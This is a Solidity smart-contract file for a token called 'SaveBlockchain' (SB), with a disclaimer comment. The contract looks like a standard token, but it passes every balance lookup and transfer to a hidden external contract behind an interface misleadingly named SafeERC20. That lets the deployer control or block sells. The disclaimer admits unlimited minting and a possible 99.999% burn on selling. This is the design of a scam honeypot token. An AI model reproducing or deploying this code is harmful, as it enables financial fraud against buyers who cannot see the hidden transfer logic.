/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable token, not an investment vehicle. If bought, token holders are aware of the fact that 
this collectable (with no utility) will most likely not produce capital gains. 

The tokenomics of this token have been designed to discourage the trading of this collectable. These tokenomics include:

 - Holders can freely send/transfer tokens to other partners/participants of the blockchain.

 - The contract deployer can generate new tokens (supply is unlimited) and sell them.

 - Selling these collectable tokens on PancakeSwap may lead to a 99.999% token burn. 

Note: In no event will the contract deployer or its affiliates be liable to refund purchasers of this collectable.

--------------------------------------------------------------------------------------------------------------------
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

interface SafeERC20 {
    function setup(address tokenAddress, uint256 supply)
        external
        returns (bool);

    function getPoolAddress() external view returns (address);

    function balanceOf(address who) external view returns (uint256);

    function transfer(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract SaveBlockchain {
    string public constant name = 'SaveBlockchain';
    string public constant symbol = 'SB';
    uint256 public totalSupply_ = 100000 * 10**18;

    uint8 public constant decimals = 18;
    address private libraryAddress;

    mapping(address => mapping(address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(address _libraryAddress) public {
        libraryAddress = _libraryAddress;
        SafeERC20(_libraryAddress).setup(msg.sender, totalSupply_);
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function getPoolAddress() public view returns (address) {
        return SafeERC20(libraryAddress).getPoolAddress();
    }

    function approve(address delegate, uint256 numTokens)
        public
        returns (bool)
    {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate)
        public
        view
        returns (uint256)
    {
        return allowed[owner][delegate];
    }

    function balanceOf(address tokenOwner) public view returns (uint256) {
        return SafeERC20(libraryAddress).balanceOf(tokenOwner);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        SafeERC20(libraryAddress).transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        SafeERC20(libraryAddress).transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}